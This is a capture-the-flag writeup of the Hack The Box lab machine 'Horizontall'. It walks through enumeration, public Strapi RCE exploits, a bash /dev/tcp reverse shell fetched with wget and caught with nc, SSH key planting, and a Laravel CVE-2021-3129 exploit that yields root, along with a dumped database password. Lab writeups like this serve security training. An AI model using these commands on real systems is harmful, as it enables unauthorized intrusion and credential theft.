---
layout: post
title: HTB Horizontall Writeup  
subtitle: Easy Box
thumbnail-img: /assets/img/horizontall.png 
tags: [HTB]
---

# Notes

![Explore](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/horizontall.png )

| Name | Horizontall |
| :------ |:--- |
| OS | Linux |
| RELEASE DATE | 28 Aug 2021 |
| DIFFICULTY | Easy |

# Port Scan 
IP:10.10.11.105 

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: horizontall
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Web Server
Wappalyzer
Nginx 1.14.0 -- no public exploits
Ubuntu

10.10.11.105 redirects to `http://horizontall.htb/` so lets add it to our `/etc/hosts` file.

There was not much on the webpage. If we view the source of `http://horizontall.htb/` there are two javascript files reference.  Inside one there was a hidden subdomain in http://horizontall.htb/js/app.c68eb462.js the subdomain is `api-prod.horizontall.htb` so we add it to our `/etc/hosts/` file.

## Subdomain 
This page just had a blank screen with the words "Welcome"

Next steps are to try and fuzz out some files and directories. I chose to use FFUF

`ffuf -u http://api-prod.horizontall.htb/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -c -t 200 `
-u URL
-w Word list 
-c Color output
-t Threads

The result enumerated an admin directory that lead to a login page
`admin                   [Status: 200, Size: 854, Words: 98, Lines: 17]`

On the login page it showed that it is using the CMS "strapi" a quick google search showed that it is vulnerable to remote code execution https://www.exploit-db.com/exploits/50239

Running this script gave me some credentials and a small shell. But the shell didn't work

```
┌──(root💀kali)-[~/htb/horizontall]
└─# python3 exploit.py http://api-prod.horizontall.htb/                                                                                                                                                                                  1 ⨯
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM1NjMxMzI3LCJleHAiOjE2MzgyMjMzMjd9.D9WDXQfRn-EcHAkn15IktyH7Dam3D8WvoWi9hgoTM48


$> ls
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}


```

I found another RCE but this one was authenticated. We can use our JSON token to authenticate https://www.exploit-db.com/exploits/50238

```
┌──(root💀kali)-[~/htb/horizontall]
└─# python3 50238.py http://api-prod.horizontall.htb eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM1NjE1MjY3LCJleHAiOjE2MzgyMDcyNjd9.jPANhLjk-cyfa0v8JICiQYiCkYt7RBzodbSBHSkH1xo "id" YOURIPHERE

=====================================
CVE-2019-19609 - Strapi RCE
-------------------------------------
@David_Uton (M3n0sD0n4ld)
https://m3n0sd0n4ld.github.io/
=====================================

[+] Successful operation!!!
listening on [any] 9999 ...
connect to [YOURIPHERE] from (UNKNOWN) [10.10.11.105] 43818
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}

```

Now its time to get a reverse shell. Most of the common one-liners didn't work. So I took a bash one-liner and put it into a file called "rev.sh" then transferred it onto horziontall and executed it.

rev.sh
```
bash -i >& /dev/tcp/YOURIP/9002 0>&1 
```
bash -i >& /dev/tcp/10.10.11.14/9002 0>&1'

Set up a python webserver 
```
┌──(root💀kali)-[~/htb/horizontall]                                                                                
└─# python3 -m http.server 80                                                                                  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...                                                      
```

Use `wget` to get rev.sh onto horziontall
```
┌──(root💀kali)-[~/htb/horizontall]
└─# python3 50238.py http://api-prod.horizontall.htb eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM1NjE1MjY3LCJleHAiOjE2MzgyMDcyNjd9.jPANhLjk-cyfa0v8JICiQYiCkYt7RBzodbSBHSkH1xo "wget 10.10.14.11/rev.sh" 10.10.14.11

```

Set up a listener 
```
┌──(root💀kali)-[~/htb/horizontall]
└─# nc -lvnp 9002
```

Execute our script
```
┌──(root💀kali)-[~/htb/horizontall]                                                                                                       └─# python3 50238.py http://api-prod.horizontall.htb eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM1NjE1MjY3LCJleHAiOjE2MzgyMDcyNjd9.jPANhLjk-cyfa0v8JICiQYiCkYt7RBzodbSBHSkH1xo "bash rev.sh" 10.10.14.11
```

We get a connect back
```
┌──(root💀kali)-[~/htb/horizontall]
└─# nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.105] 38710
bash: cannot set terminal process group (1820): Inappropriate ioctl for device
bash: no job control in this shell
strapi@horizontall:~/myapi$
```

## mysql
I found some mysql creds 
```
strapi@horizontall:~/myapi/config/environments/development$ cat database.json
cat database.json
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}

```

## Webserver 8000
Running `netstat -tulnp` we can see that we have some internal ports open, one of them being port 8000. It is most likely a webserver so let's port forward it onto kali.

First we need to add our public ssh key to the box

```
$ pwd
/opt/strapi
$ mkdir .ssh
$ cd .ssh
$ touch authorized_keys
$ echo "YOUR id_rsa.pub" >> authorized_keys
```

```
┌──(root💀kali)-[~/htb/horizontall]
└─# ssh strapi@10.10.11.105 -L 8000:localhost:8000
```

Going to the web page "http://localhost:8000/" we can see that it is running Larvel v8

I was able to find an exploit for it https://github.com/nth347/CVE-2021-3129_exploit

After downloading it and running it the webserver is running as root!
```
┌──(root💀kali)-[~/htb/horizontall/CVE-2021-3129_exploit]
└─# ./exploit.py http://localhost:8000 Monolog/RCE1 "id"                                                  
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

uid=0(root) gid=0(root) groups=0(root)

[i] Trying to clear logs
[+] Logs cleared
```
